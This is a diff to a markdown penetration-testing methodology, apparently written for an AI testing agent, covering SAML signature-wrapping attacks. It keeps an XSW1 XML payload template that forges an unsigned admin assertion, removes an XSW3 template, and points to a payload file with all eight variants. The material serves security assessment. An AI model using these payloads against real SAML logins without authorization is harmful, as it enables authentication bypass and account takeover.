@@ -112,35 +112,25 @@ curl -X POST https://target/saml/acs \
 - **Partially vulnerable**: Login succeeds but with limited session → still HIGH
 - **Not vulnerable**: Error about missing/invalid signature → properly implemented
 
-### 2.2 Signature Wrapping Attacks
+### 2.2 Signature Wrapping Attacks (XSW1-8)
 
-The SP verifies a signature on one element but uses a different (unsigned) element for authentication.
+The SP verifies a signature on one element but uses a different (unsigned) element for authentication. There are 8 documented XSW variants — all templates in `agent/references/payloads/saml-attack-payloads.md` § "Signature Wrapping (XSW) Variants."
 
-**XSW Attack Variants (test 1-8):**
+**Concept (XSW1 — forged before signed):**
 
 ```xml
-<!-- XSW1: Move genuine signed assertion, add forged assertion before it -->
 <samlp:Response>
-  <saml:Assertion ID="forged">  <!-- Unsigned, contains attacker NameID -->
+  <saml:Assertion ID="forged">  <!-- Unsigned, attacker NameID -->
     <saml:Subject><saml:NameID>admin@target.example</saml:NameID></saml:Subject>
   </saml:Assertion>
   <saml:Assertion ID="genuine">  <!-- Signed, original NameID -->
-    <ds:Signature>...</ds:Signature>
+    <ds:Signature><ds:Reference URI="#genuine"/></ds:Signature>
     <saml:Subject><saml:NameID>user@target.example</saml:NameID></saml:Subject>
   </saml:Assertion>
 </samlp:Response>
-
-<!-- XSW3: Wrap genuine inside forged -->
-<saml:Assertion ID="forged">
-  <saml:Subject><saml:NameID>admin@target.example</saml:NameID></saml:Subject>
-  <saml:Assertion ID="genuine">
-    <ds:Signature>...</ds:Signature>
-    <saml:Subject><saml:NameID>user@target.example</saml:NameID></saml:Subject>
-  </saml:Assertion>
-</saml:Assertion>
 ```
 
-**Key insight**: The signature validates over the signed element's subtree. If the SP uses XPath to find the NameID and picks the first match (which is the forged one), authentication is bypassed.
+**Key insight**: The signature validates over the signed element's subtree. If the SP uses XPath to find the NameID and picks the first match (the forged one), authentication is bypassed. Test all 8 variants from the reference — different libraries are vulnerable to different placement strategies.
 
 ### 2.3 Certificate Acceptance Testing
 
